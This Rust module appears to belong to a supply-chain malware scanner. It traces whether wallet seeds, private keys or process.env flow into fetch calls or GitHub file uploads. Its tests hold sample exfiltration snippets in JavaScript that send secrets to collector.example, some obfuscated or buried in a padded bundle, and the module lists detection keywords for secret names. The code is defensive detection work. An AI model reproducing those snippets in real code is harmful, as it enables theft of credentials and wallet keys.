mod bundles;

use oxc_ast::{AstKind, ast::*};
use oxc_semantic::{Semantic, SymbolId};
use std::collections::{HashMap, HashSet};

const SECRET: u8 = 1;
const ENVIRONMENT: u8 = 2;
const MAX_DEPTH: usize = 32;
const MAX_STEPS: usize = 4096;

#[derive(Clone, Copy)]
pub(super) struct Leak {
    pub offset: usize,
    pub environment: bool,
}

fn member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, &'s str)> {
    match expression.get_inner_expression() {
        Expression::StaticMemberExpression(value) => {
            Some((&value.object, value.property.name.as_str()))
        }
        Expression::ComputedMemberExpression(value) => {
            let Expression::StringLiteral(name) = value.expression.get_inner_expression() else {
                return None;
            };
            Some((&value.object, name.value.as_str()))
        }
        _ => None,
    }
}

fn callee<'s, 'a>(expression: &'s Expression<'a>) -> &'s Expression<'a> {
    let mut current = expression.get_inner_expression();
    while let Expression::SequenceExpression(sequence) = current {
        let Some(last) = sequence.expressions.last() else {
            break;
        };
        current = last.get_inner_expression();
    }
    current
}

fn name<'s>(expression: &'s Expression<'_>) -> Option<&'s str> {
    let expression = callee(expression);
    expression
        .get_identifier_reference()
        .map(|value| value.name.as_str())
        .or_else(|| member(expression).map(|(_, name)| name))
}

fn secret_name(name: &str) -> bool {
    matches!(
        name.trim_start_matches('_'),
        "privateKey"
            | "secretKey"
            | "mnemonic"
            | "seedPhrase"
            | "private_key"
            | "secret_key"
            | "seed_phrase"
    )
}

pub(super) fn is_candidate(call: &CallExpression<'_>) -> bool {
    matches!(
        name(&call.callee),
        Some("fetch" | "createOrUpdateFileContents")
    )
}

struct Flow<'s, 'a> {
    semantic: &'s Semantic<'a>,
    parameters: HashMap<SymbolId, (u32, usize)>,
    callers: HashMap<u32, Vec<&'a CallExpression<'a>>>,
    methods: HashMap<(u32, bool), HashMap<String, Option<u32>>>,
    steps: usize,
    written: HashSet<SymbolId>,
    bundles: bundles::Bundles,
}

impl<'s, 'a> Flow<'s, 'a> {
    fn symbol(&self, identifier: &IdentifierReference<'_>) -> Option<SymbolId> {
        self.semantic
            .scoping()
            .get_reference(identifier.reference_id.get()?)
            .symbol_id()
    }

    fn initial(&self, identifier: &IdentifierReference<'_>) -> Option<&'a Expression<'a>> {
        let symbol = self.symbol(identifier)?;
        if self.written.contains(&symbol) {
            return None;
        }
        let AstKind::VariableDeclarator(variable) = self
            .semantic
            .nodes()
            .kind(self.semantic.scoping().symbol_declaration(symbol))
        else {
            return None;
        };
        if !matches!(&variable.id, BindingPattern::BindingIdentifier(_)) {
            return None;
        }
        variable.init.as_ref()
    }

    fn global(&self, expression: &Expression<'_>, name: &str) -> bool {
        expression
            .get_inner_expression()
            .get_identifier_reference()
            .is_some_and(|identifier| {
                identifier.name == name && self.semantic.is_reference_to_global_variable(identifier)
            })
    }

    fn class(&self, expression: &Expression<'_>, depth: usize) -> Option<(&'a Class<'a>, bool)> {
        if depth >= 8 {
            return None;
        }
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                let symbol = self.symbol(identifier)?;
                if self.written.contains(&symbol) {
                    return None;
                }
                match self
                    .semantic
                    .nodes()
                    .kind(self.semantic.scoping().symbol_declaration(symbol))
                {
                    AstKind::Class(class) => Some((class, true)),
                    _ => self.class(self.initial(identifier)?, depth + 1),
                }
            }
            Expression::NewExpression(instance) => self
                .class(&instance.callee, depth + 1)
                .map(|(class, _)| (class, false)),
            Expression::StaticMemberExpression(_) | Expression::ComputedMemberExpression(_) => {
                let (object, export) = member(expression)?;
                let request = match object.get_inner_expression() {
                    Expression::Identifier(identifier) => self.initial(identifier)?,
                    object => object,
                };
                let Expression::CallExpression(request) = request.get_inner_expression() else {
                    return None;
                };
                self.bundles
                    .class(self.semantic, request, export)
                    .map(|class| (class, true))
            }
            _ => None,
        }
    }

    fn target(&self, expression: &Expression<'_>, depth: usize) -> Option<u32> {
        if depth >= 8 {
            return None;
        }
        let expression = callee(expression);
        match expression {
            Expression::Identifier(identifier) => {
                let symbol = self.symbol(identifier)?;
                if self.written.contains(&symbol) {
                    return None;
                }
                match self
                    .semantic
                    .nodes()
                    .kind(self.semantic.scoping().symbol_declaration(symbol))
                {
                    AstKind::Function(function) => Some(function.span.start),
                    _ => self.target(self.initial(identifier)?, depth + 1),
                }
            }
            Expression::FunctionExpression(function) => Some(function.span.start),
            Expression::ArrowFunctionExpression(function) => Some(function.span.start),
            _ => {
                let (object, name) = member(expression)?;
                let (class, static_receiver) = self.class(object, 0)?;
                self.methods
                    .get(&(class.span.start, static_receiver))?
                    .get(name)
                    .copied()
                    .flatten()
            }
        }
    }

    fn value(&mut self, expression: &Expression<'_>, depth: usize) -> u8 {
        if depth >= MAX_DEPTH || self.steps == 0 {
            return 0;
        }
        self.steps -= 1;
        let next = depth + 1;
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                if let Some(initial) = self.initial(identifier) {
                    return self.value(initial, next);
                }
                let Some(symbol) = self.symbol(identifier) else {
                    return 0;
                };
                if self.written.contains(&symbol) {
                    return 0;
                }
                let Some(&(owner, index)) = self.parameters.get(&symbol) else {
                    return 0;
                };
                if secret_name(identifier.name.as_str()) {
                    return SECRET;
                }
                let count = self.callers.get(&owner).map_or(0, Vec::len);
                let mut result = 0;
                for position in 0..count {
                    if self.steps == 0 {
                        break;
                    }
                    let call = self.callers[&owner][position];
                    if let Some(argument) =
                        call.arguments.get(index).and_then(Argument::as_expression)
                    {
                        result |= self.value(argument, next);
                    }
                }
                result
            }
            Expression::StaticMemberExpression(_) | Expression::ComputedMemberExpression(_) => {
                let Some((object, name)) = member(expression) else {
                    return 0;
                };
                if name == "env" && self.global(object, "process") {
                    return ENVIRONMENT;
                }
                if let Some(value) = self.field(object, name, 0) {
                    return self.value(value, next);
                }
                if object
                    .get_inner_expression()
                    .get_identifier_reference()
                    .and_then(|identifier| self.symbol(identifier))
                    .is_some_and(|symbol| self.written.contains(&symbol))
                {
                    return 0;
                }
                if secret_name(name) {
                    return SECRET;
                }
                0
            }
            Expression::ObjectExpression(object) => {
                let mut seen = HashSet::new();
                let mut result = 0;
                for property in object.properties.iter().rev() {
                    if self.steps == 0 {
                        break;
                    }
                    match property {
                        ObjectPropertyKind::ObjectProperty(property) => {
                            let Some(key) = property.key.static_name() else {
                                return result;
                            };
                            if seen.insert(key) {
                                result |= self.value(&property.value, next);
                            }
                        }
                        ObjectPropertyKind::SpreadProperty(_) => return result,
                    }
                }
                result
            }
            Expression::ArrayExpression(array) => {
                let mut result = 0;
                for value in array
                    .elements
                    .iter()
                    .filter_map(ArrayExpressionElement::as_expression)
                {
                    if self.steps == 0 {
                        break;
                    }
                    result |= self.value(value, next);
                }
                result
            }
            Expression::TemplateLiteral(template) => {
                let mut result = 0;
                for value in &template.expressions {
                    if self.steps == 0 {
                        break;
                    }
                    result |= self.value(value, next);
                }
                result
            }
            Expression::BinaryExpression(binary) if binary.operator.as_str() == "+" => {
                self.value(&binary.left, next) | self.value(&binary.right, next)
            }
            Expression::ConditionalExpression(value) => {
                self.value(&value.consequent, next) | self.value(&value.alternate, next)
            }
            Expression::LogicalExpression(value) => {
                self.value(&value.left, next) | self.value(&value.right, next)
            }
            Expression::AwaitExpression(value) => self.value(&value.argument, next),
            Expression::SequenceExpression(sequence) => sequence
                .expressions
                .last()
                .map_or(0, |value| self.value(value, next)),
            Expression::CallExpression(call) => {
                let function = callee(&call.callee);
                let Some(function_name) = name(function) else {
                    return 0;
                };
                if self.target(function, 0).is_some()
                    || member(function)
                        .is_some_and(|(object, property)| self.field(object, property, 0).is_some())
                {
                    return 0;
                }
                if matches!(
                    function_name,
                    "generateSeed"
                        | "generatePrivateKey"
                        | "generateMnemonic"
                        | "mnemonicToSeedSync"
                        | "mnemonicToSeed"
                ) {
                    return SECRET;
                }
                if matches!(
                    function_name,
                    "slice" | "substring" | "substr" | "split" | "reverse" | "join" | "toString"
                ) {
                    return member(function).map_or(0, |(object, _)| self.value(object, next));
                }
                let encoding = matches!(
                    function_name,
                    "encode" | "bytesToHex" | "toBuffer" | "btoa" | "encodeURIComponent"
                ) || member(function).is_some_and(|(object, method)| {
                    (method == "stringify" && self.global(object, "JSON"))
                        || (method == "from" && self.global(object, "Buffer"))
                });
                if encoding {
                    return call
                        .arguments
                        .first()
                        .and_then(Argument::as_expression)
                        .map_or(0, |value| self.value(value, next));
                }
                0
            }
            _ => 0,
        }
    }

    fn field<'e>(
        &self,
        expression: &'e Expression<'a>,
        field: &str,
        depth: usize,
    ) -> Option<&'e Expression<'a>>
    where
        'a: 'e,
    {
        if depth >= 8 {
            return None;
        }
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                self.field(self.initial(identifier)?, field, depth + 1)
            }
            Expression::ObjectExpression(object) => {
                for property in object.properties.iter().rev() {
                    match property {
                        ObjectPropertyKind::ObjectProperty(property) => {
                            let key = property.key.static_name()?;
                            if key == field {
                                return Some(&property.value);
                            }
                        }
                        ObjectPropertyKind::SpreadProperty(_) => return None,
                    }
                }
                None
            }
            _ => None,
        }
    }

    fn sink(&self, call: &'a CallExpression<'a>) -> Option<&'a Expression<'a>> {
        let function = callee(&call.callee);
        let fetch = self.global(function, "fetch")
            || member(function).is_some_and(|(object, method)| {
                method == "fetch"
                    && (self.global(object, "globalThis") || self.global(object, "window"))
            });
        if fetch {
            let url = call.arguments.first()?.as_expression()?;
            let Expression::StringLiteral(url) = url.get_inner_expression() else {
                return None;
            };
            if !url.value.starts_with("https://") && !url.value.starts_with("http://") {
                return None;
            }
            return call.arguments.get(1)?.as_expression();
        }
        let (repos, "createOrUpdateFileContents") = member(function)? else {
            return None;
        };
        let (rest, "repos") = member(repos)? else {
            return None;
        };
        let (_, "rest") = member(rest)? else {
            return None;
        };
        self.field(call.arguments.first()?.as_expression()?, "content", 0)
    }
}

fn is_source_candidate(kind: AstKind<'_>) -> bool {
    match kind {
        AstKind::FormalParameter(parameter) => {
            matches!(&parameter.pattern, BindingPattern::BindingIdentifier(identifier) if secret_name(identifier.name.as_str()))
        }
        AstKind::StaticMemberExpression(member) => {
            secret_name(member.property.name.as_str()) || member.property.name == "env"
        }
        AstKind::ComputedMemberExpression(member) => {
            matches!(member.expression.get_inner_expression(), Expression::StringLiteral(name) if secret_name(name.value.as_str()) || name.value == "env")
        }
        AstKind::CallExpression(call) => matches!(
            name(&call.callee),
            Some(
                "generateSeed"
                    | "generatePrivateKey"
                    | "generateMnemonic"
                    | "mnemonicToSeedSync"
                    | "mnemonicToSeed"
            )
        ),
        _ => false,
    }
}

pub(super) fn analyze(semantic: &Semantic<'_>) -> Option<Leak> {
    let candidates: Vec<_> = semantic
        .nodes()
        .iter()
        .filter_map(|node| match node.kind() {
            AstKind::CallExpression(call) if is_candidate(call) => Some(call),
            _ => None,
        })
        .collect();
    if candidates.is_empty()
        || !semantic
            .nodes()
            .iter()
            .any(|node| is_source_candidate(node.kind()))
    {
        return None;
    }
    let mut flow = Flow {
        semantic,
        parameters: HashMap::new(),
        callers: HashMap::new(),
        methods: HashMap::new(),
        steps: MAX_STEPS,
        written: semantic
            .scoping()
            .symbol_ids()
            .filter(|symbol| {
                semantic
                    .scoping()
                    .get_resolved_references(*symbol)
                    .any(|reference| reference.is_write())
            })
            .collect(),
        bundles: bundles::Bundles::collect(semantic),
    };
    for node in semantic.nodes().iter() {
        if let AstKind::Class(class) = node.kind() {
            for element in &class.body.body {
                if let ClassElement::MethodDefinition(method) = element
                    && let Some(name) = method.key.static_name()
                {
                    let target = (method.kind == MethodDefinitionKind::Method
                        && method.decorators.is_empty())
                    .then_some(method.value.span.start);
                    flow.methods
                        .entry((class.span.start, method.r#static))
                        .or_default()
                        .insert(name.into_owned(), target);
                }
            }
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::AssignmentExpression(assignment) = node.kind() {
            let object = match &assignment.left {
                AssignmentTarget::StaticMemberExpression(member) => Some(&member.object),
                AssignmentTarget::ComputedMemberExpression(member) => Some(&member.object),
                _ => None,
            };
            if let Some(object) = object {
                if let AssignmentTarget::StaticMemberExpression(member) = &assignment.left
                    && member.property.name != "prototype"
                    && let Some((class, true)) = flow.class(object, 0)
                    && !flow
                        .methods
                        .get(&(class.span.start, true))
                        .is_some_and(|methods| methods.contains_key(member.property.name.as_str()))
                {
                    continue;
                }
                super::bindings::mark_mutated_receiver(object, semantic, &mut flow.written, 0);
            }
        }
    }
    for node in semantic.nodes().iter() {
        let (owner, parameters) = match node.kind() {
            AstKind::Function(function) => (function.span.start, &function.params),
            AstKind::ArrowFunctionExpression(function) => (function.span.start, &function.params),
            _ => continue,
        };
        for (index, parameter) in parameters.items.iter().enumerate() {
            if let BindingPattern::BindingIdentifier(identifier) = &parameter.pattern
                && let Some(symbol) = identifier.symbol_id.get()
            {
                flow.parameters.insert(symbol, (owner, index));
            }
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::CallExpression(call) = node.kind()
            && let Some(target) = flow.target(&call.callee, 0)
        {
            flow.callers.entry(target).or_default().push(call);
        }
    }
    for call in candidates {
        let Some(payload) = flow.sink(call) else {
            continue;
        };
        flow.steps = MAX_STEPS;
        let value = if name(&call.callee) == Some("fetch") {
            let headers = flow.field(payload, "headers", 0);
            let body = flow.field(payload, "body", 0);
            headers.map_or(0, |value| flow.value(value, 0))
                | body.map_or(0, |value| flow.value(value, 0))
        } else {
            flow.value(payload, 0)
        };
        if value != 0 {
            return Some(Leak {
                offset: call.span.start as usize,
                environment: value & ENVIRONMENT != 0,
            });
        }
    }
    None
}

#[cfg(test)]
mod tests {
    fn leaks(source: &str) -> bool {
        let result = super::super::analyze_bytes("index.js", source.as_bytes());
        assert_eq!(result.unparsed_files, 0, "invalid control: {source}");
        serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"] == true
    }

    #[test]
    fn wallet_seed_in_an_outbound_header_is_a_security_finding() {
        assert!(leaks(
            "const seed = wallet.generateSeed(); fetch('https://collector.example/upload', {headers: {'x-session': seed}});"
        ));
    }

    #[test]
    fn secret_passed_through_a_static_encoding_helper_is_a_security_finding() {
        assert!(leaks(
            "class Transport { static send(value) { const data = bs58.encode(value); fetch('https://collector.example/upload', {headers: {'x-session': data.substring(0,24).split('').reverse().join('')}}); } } function use(secretKey) { Transport.send(secretKey); }"
        ));
    }

    #[test]
    fn entire_environment_uploaded_through_a_repository_helper_is_a_security_finding() {
        assert!(leaks(
            "class Publisher { async publish(data) { await this.client.rest.repos.createOrUpdateFileContents({content: Buffer.from(data).toString('base64')}); } } const publisher = new Publisher(); const payload = {environment: process.env}; publisher.publish(JSON.stringify(payload));"
        ));
    }

    #[test]
    fn bundled_class_helper_preserves_the_environment_upload_flow() {
        assert!(leaks(
            r#"var modules = {17: (m,e,r) => { r.d(e, {Publisher: () => Publisher}); class Publisher { publish(data) { this.client.rest.repos.createOrUpdateFileContents({content: Buffer.from(data).toString('base64')}); } } }}; function load(id) { const m = {exports:{}}; modules[id].call(m.exports,m,m.exports,load); return m.exports; } const api = load(17); const publisher = new api.Publisher(); publisher.publish(JSON.stringify({environment:process.env}));"#
        ));
    }

    #[test]
    fn source_in_the_middle_of_a_four_megabyte_bundle_is_analyzed() {
        let mut source = String::from("/*");
        source.push_str(&" ".repeat(1536 * 1024));
        source.push_str("*/const seed = wallet.generateSeed(); fetch('https://collector.example/upload', {headers: {'x-session': seed}});");
        source.push_str("/*");
        source.push_str(&" ".repeat(1536 * 1024));
        source.push_str("*/");
        let directory = tempfile::tempdir().unwrap();
        let mut analyzer = super::super::PackageAnalyzer::new();
        analyzer.feed(std::path::Path::new("bundle.js"), source.as_bytes());
        let result = analyzer.finalize(directory.path());
        assert_eq!(
            serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"],
            true
        );
    }

    #[test]
    fn disjoint_file_samples_do_not_establish_a_secret_flow() {
        let mut source = String::from("function privateWork(secretKey) {/*");
        source.push_str(&" ".repeat(2 * 1024 * 1024));
        source.push_str("*/ return; } function publicWork() { const secretKey = 'public'; /*");
        source.push_str(&" ".repeat(2 * 1024 * 1024));
        source.push_str("*/ fetch('https://api.example', {body: secretKey}); }");
        let directory = tempfile::tempdir().unwrap();
        let mut analyzer = super::super::PackageAnalyzer::new();
        analyzer.feed(std::path::Path::new("bundle.js"), source.as_bytes());
        let result = analyzer.finalize(directory.path());
        assert!(!result.meta.oversized_source_files.is_empty());
        assert!(!result.supply_chain.credential_exfiltration);
        assert!(
            !result
                .meta
                .evidence
                .iter()
                .any(|entry| entry.rule_id == "credential-exfiltration")
        );
    }

    #[test]
    fn overwritten_secrets_and_unused_fetch_options_do_not_report_leaks() {
        for source in [
            "function send(secretKey) { secretKey = 'public'; fetch('https://api.example', {body: secretKey}); }",
            "function send(secretKey) { fetch('https://api.example', {headers: {session: secretKey, session: 'public'}}); }",
            "fetch('https://api.example', {environment: process.env});",
            "function send(secretKey) { const options = {body: secretKey, body: 'public'}; fetch('https://api.example', options); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
    fn computed_properties_that_can_replace_a_payload_do_not_establish_a_secret_flow() {
        for source in [
            "function send(secretKey) { const key = 'body'; fetch('https://api.example', {body: secretKey, [key]: 'public'}); }",
            "function send(secretKey) { const key = 'headers'; fetch('https://api.example', {headers: {session: secretKey}, [key]: {session:'public'}}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
        assert!(leaks(
            "function send(secretKey, key) { fetch('https://api.example', {[key]: 'public', body: secretKey}); }"
        ));
    }

    #[test]
    fn mutated_objects_and_distinct_method_receivers_do_not_link_unrelated_values() {
        for source in [
            "function send(secretKey) { const options = {body: secretKey}; options.body = 'public'; fetch('https://api.example', options); }",
            "function send(secretKey) { const options = {body: secretKey}; const alias = options; alias.body = 'public'; fetch('https://api.example', options); }",
            "const keys = {privateKey:'public-id'}; fetch('https://api.example', {body: keys.privateKey});",
            "class Transport { static send(value) { fetch('https://api.example', {body:value}); } send(value) {} } new Transport().send(process.env);",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
    fn unrelated_class_properties_do_not_hide_a_secret_upload() {
        assert!(leaks(
            "class Transport { static send(value) { fetch('https://collector.example', {body:value}); } } Transport.chunkSize = 100; function send(secretKey) { Transport.send(secretKey); }"
        ));
    }

    #[test]
    fn local_functions_with_wallet_api_names_do_not_establish_secret_origins() {
        for source in [
            "const wallet = {generateSeed: () => 'public-id'}; fetch('https://api.example', {body: wallet.generateSeed()});",
            "function generateSeed() { return 'public-id'; } fetch('https://api.example', {body: generateSeed()});",
            "function encode(secretKey) { return 'redacted'; } function send(privateKey) { fetch('https://api.example', {body: encode(privateKey)}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
    fn normal_wallet_authentication_and_security_tools_are_not_secret_leaks() {
        for source in [
            "function send(privateKey) { const signature = sign(privateKey, message); fetch('https://api.example', {headers: {authorization: signature}}); }",
            "const token = process.env.API_TOKEN; fetch('https://api.example', {headers: {authorization: token}});",
            "const seed = wallet.generateSeed(); const address = deriveAddress(seed); fetch('https://api.example', {body: JSON.stringify({address})});",
            "function scan() { const environment = process.env; return redact(environment); }",
            "const publisher = new Publisher(); publisher.publish(JSON.stringify({version: process.env.VERSION}));",
            "const source = `fetch('https://collector.example', {body: process.env})`;",
            "function example(fetch, secretKey) { fetch('https://collector.example', {headers: {'x-session': secretKey}}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }
}
